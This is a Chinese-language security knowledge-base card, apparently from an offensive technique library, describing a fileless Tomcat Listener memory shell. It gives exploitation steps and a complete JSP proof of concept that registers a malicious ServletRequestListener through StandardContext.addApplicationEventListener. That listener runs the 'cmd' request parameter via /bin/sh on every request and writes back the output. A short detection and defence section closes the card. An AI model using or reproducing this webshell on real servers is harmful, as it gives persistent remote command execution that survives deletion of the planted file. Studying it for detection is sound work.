---
id: web-java-component-tomcat-listener-memshell
title: Tomcat Listener 内存马：StandardContext.addApplicationEventListener 注入请求监听器
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-listener-memshell
aliases:
- Tomcat Listener 内存马
- ServletRequestListener 内存马
- addApplicationEventListener
- applicationEventListenersList
- Tomcat 监听器 WebShell
tags:
- java
- tomcat
- memshell
- persistence
- listener
- servletrequestlistener
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:36:23+08:00'
  notes: 已对照原文3.2节与图46-52核对：恶意ServletRequestListener+StandardContext.addApplicationEventListener注册；requestInitialized/requestDestroyed在fireRequestInitEvent/fireRequestDestroyEvent中执行，getApplicationEventListeners返回applicationEventListenersList；原文示例在requestDestroyed回显，卡内PoC放在requestInitialized，未实测。原文未给组件受影响版本，未设置affected_versions。
---

## 一句话结论

在已能执行一次 Java/JSP 代码的 Tomcat 中，反射取得 `StandardContext` 并调用公开的 `addApplicationEventListener()` 把恶意 `ServletRequestListener` 加入应用事件监听器列表；此后每个请求的 `requestInitialized`/`requestDestroyed` 都会执行攻击者代码，形成不落文件的 Listener 内存马。

## 原理

- Tomcat 的 Listener 来源有两类：`web.xml` 中配置并由容器实例化的 Listener，以及运行期存放在 `StandardContext.applicationEventListenersList` 中的 Listener。
- 请求处理时，`StandardHostValve.invoke` → `StandardContext.fireRequestInitEvent(request)`：
  ```java
  Object[] instances = this.getApplicationEventListeners();
  ...
  for (Object instance : instances) {
      if (instance instanceof ServletRequestListener) {
          ((ServletRequestListener) instance).requestInitialized(event);
      }
  }
  ```
  `getApplicationEventListeners()` 直接返回 `applicationEventListenersList.toArray()`。
- `StandardContext.addApplicationEventListener(Object)` 会把对象追加到该列表。由于这是公开方法，拿到 `StandardContext` 后无需反射写字段即可注册恶意 Listener。
- 恶意 `ServletRequestListener.requestInitialized` 能拿到 `ServletRequestEvent.getServletRequest()`，从而读取 `cmd` 参数、执行命令；若需要回显，可在 `requestDestroyed` 中通过 ServletRequest 的 `request` 字段取得 Tomcat `Request`/`Response` 并写入响应。

## 触发条件

- 目标为 Tomcat（Listener 机制依赖 Servlet 规范与 Tomcat 的 `StandardContext`）；
- 攻击者已能执行一次 Java 代码或 JSP；
- 能取得当前应用的 `StandardContext`（常用 `ServletContext → ApplicationContext → StandardContext` 反射链，或从 `Request.getContext()` 获取）；
- 应用未限制动态注册 Listener。

## 利用步骤

1. 通过 `request.getServletContext()` 反射两次 `context` 字段得到 `StandardContext`；或反射 `request` 字段得到 `org.apache.catalina.connector.Request` 后调用 `getContext()`。
2. 编写恶意 `ServletRequestListener`：在 `requestInitialized` 中判断 `cmd` 参数并执行命令。
3. 调用 `standardContext.addApplicationEventListener(evilListener)`。
4. 访问任意路由携带 `?cmd=...`；请求初始化阶段即触发命令。
5. 删除植入文件后功能仍存在，直到应用重启。

## PoC

```jsp
<%@ page import="java.lang.reflect.Field, java.io.*, java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="javax.servlet.*" %>
<%!
  public class EvilListener implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent e) {}
    public void requestInitialized(ServletRequestEvent e) {
      try {
        HttpServletRequest req = (HttpServletRequest) e.getServletRequest();
        String cmd = req.getParameter("cmd");
        if (cmd == null) return;
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        Scanner s = new Scanner(p.getInputStream(), "GBK").useDelimiter("\\A");
        String outStr = s.hasNext() ? s.next() : "";
        Field rf = req.getClass().getDeclaredField("request");
        rf.setAccessible(true);
        Request real = (Request) rf.get(req);
        real.getResponse().setCharacterEncoding("GBK");
        real.getResponse().getWriter().write(outStr);
      } catch (Exception ignored) {}
    }
  }
%>
<%
  Field reqF = request.getClass().getDeclaredField("request");
  reqF.setAccessible(true);
  Request real = (Request) reqF.get(request);
  StandardContext ctx = (StandardContext) real.getContext();
  ctx.addApplicationEventListener(new EvilListener());
  out.print("inject ok");
%>
```

## 变体与关联

- 变体：也可通过 `ServletContext → ApplicationContext → StandardContext` 反射链获取上下文；或使用 `request.getSession().getServletContext()`。
- 变体：只实现 `requestInitialized` 时无响应写出能力，适合盲执行/反连；需要回显时实现 `requestDestroyed` 并反射取 `Response`。
- 关联：[[web-java-component-tomcat-filter-memshell]]、[[web-java-component-tomcat-valve-memshell]]（同类容器组件内存马）。
- 边界：重启后清空；`applicationEventListenersList` 被清空或应用启用严格安全管理时失效。

## 检测与防御

- 检测：运行期 `applicationEventListenersList` 出现非部署包内、类名随机的 Listener；请求处理链中 `fireRequestInitEvent` 调用栈出现可疑类；JSP 中出现 `addApplicationEventListener`。
- 处置：重启应用；用 Arthas/内存 dump 枚举 `StandardContext.applicationEventListenersList`。
- 防御：封堵 JSP/任意代码执行入口；RASP 监控 `addApplicationEventListener` 与动态类加载；定期核对 Listener 清单与部署包。
